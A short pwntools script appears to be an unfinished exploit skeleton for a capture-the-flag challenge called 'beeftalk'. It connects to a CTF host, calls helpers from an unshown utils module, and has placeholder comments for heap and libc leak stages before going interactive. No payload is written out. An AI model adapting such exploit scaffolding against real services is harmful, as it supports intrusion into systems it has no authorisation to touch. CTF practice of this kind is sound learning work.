from pwn import *

from utils import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']


# r = process("./beeftalk")
r= remote("edu-ctf.zoolab.org", 30207)


# get heap


token,_ = signup(r,b"dummy",keep = "y")
chat_server(r,token)
# get libc    


r.interactive()

    





